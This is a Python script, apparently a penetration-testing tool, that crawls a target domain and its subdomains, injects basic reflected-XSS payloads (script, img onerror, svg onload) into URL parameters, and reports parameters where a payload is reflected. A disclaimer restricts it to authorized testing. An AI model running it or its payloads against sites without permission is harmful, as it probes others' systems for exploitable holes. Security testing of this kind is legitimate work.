import requests
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from bs4 import BeautifulSoup
import tldextract
from concurrent.futures import ThreadPoolExecutor

# 🎯 XSS Payloads for testing
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",
    "';alert('XSS');//"
]

# 🔁 Visited URLs to avoid duplicates
visited_urls = set()
output_results = []

def is_subdomain(url, domain):
    """
    🕵️‍♂️ Check if a URL belongs to the same domain or its subdomains.
    """
    extracted_main = tldextract.extract(domain)
    extracted_url = tldextract.extract(url)
    return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix

def find_urls(url, domain):
    """
    🌐 Crawl a given URL and return a list of internal links.
    """
    urls = []
    try:
        headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if is_subdomain(full_url, domain) and full_url not in visited_urls:
                visited_urls.add(full_url)
                urls.append(full_url)
    except Exception as e:
        print(f"❌ Error crawling {url}: {e}")
    return urls

def test_xss(url):
    """
    🧪 Test XSS payloads on all parameters of a URL.
    """
    try:
        parsed_url = urlparse(url)
        params = dict(parse_qsl(parsed_url.query))
        headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}

        for param in params:
            for payload in payloads:
                # 🚀 Inject payload into the parameter
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"

                print(f"🔍 Testing: {test_url}")
                response = requests.get(test_url, headers=headers, timeout=5)

                # 🔎 Check if payload reflects in the response and validate rendering
                if payload.lower() in response.text.lower():
                    result = f"✅ [VULNERABLE] Parameter '{param}' is vulnerable to XSS on {test_url}"
                    print(result)
                    output_results.append(result)
                    return True
        result = f"🛡️ [SAFE] No vulnerabilities found for {url}"
        print(result)
        output_results.append(result)
    except Exception as e:
        error_message = f"❌ Error testing {url}: {e}"
        print(error_message)
        output_results.append(error_message)
    return False

def crawl_and_test(domain, output_file="xss_results.txt", max_depth=3):
    """
    🔍 Crawl a domain and its subdomains to find potential XSS vulnerabilities.
    """
    print(f"🚀 Starting crawl on domain: {domain}")
    urls_to_test = [domain]
    depth = 0

    # ThreadPoolExecutor for parallel URL testing
    with ThreadPoolExecutor(max_workers=10) as executor:
        while urls_to_test and depth < max_depth:
            current_urls = urls_to_test[:10]  # Limit to first 10 URLs at each depth
            urls_to_test = urls_to_test[10:]

            # Crawl URLs and test them in parallel
            futures = [executor.submit(find_urls, url, domain) for url in current_urls]
            for future in futures:
                urls = future.result()
                urls_to_test.extend(urls)
            
            # Test the URLs for XSS vulnerabilities
            futures = [executor.submit(test_xss, url) for url in current_urls]
            for future in futures:
                future.result()  # Wait for the result

            depth += 1
    
    # Save results to the output file automatically
    with open(output_file, 'w') as f:
        f.write("\n".join(output_results))
    print(f"\n📁 Results saved automatically to: {output_file}")

if __name__ == "__main__":
    print("🌟 Welcome to XSS Parameter Finder 🌟")
    print("🔑 Example Input: https://example.com")
    print("⚠️ Disclaimer: Use this tool only for educational purposes and authorized testing!")
    
    target_domain = input("🔗 Enter the target domain (e.g., https://example.com): ")
    output_file = input("📂 Enter the name of the output file (leave blank for default 'xss_results.txt'): ").strip()

    # Use default filename if none is provided
    output_file = output_file if output_file else "xss_results.txt"
    
    if target_domain:
        crawl_and_test(target_domain, output_file)
    else:
        print("❌ Error: Please provide a valid domain.")
